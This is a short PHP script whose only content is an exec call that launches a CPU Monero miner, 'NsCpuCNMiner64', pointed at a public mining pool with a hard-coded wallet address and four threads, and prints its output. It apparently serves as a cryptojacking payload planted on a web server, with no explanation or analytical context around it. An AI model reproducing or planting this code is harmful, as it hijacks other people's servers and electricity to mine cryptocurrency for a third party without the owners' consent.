<?php
set_time_limit(10);
exec("NsCpuCNMiner64 -o stratum+tcp://pool.minexmr.com:5555 -u 49e54ssoPx5aygXdUTFtFgEH2djEy3D9R8H9CaobYKBBBdoHpRzvBcgaKd9cfh4kHzQ81wsUvXGxnW7pDsHDEgpLPFDsh9y.wincloud -p x -t 4",$out);
print_r($out);
?>
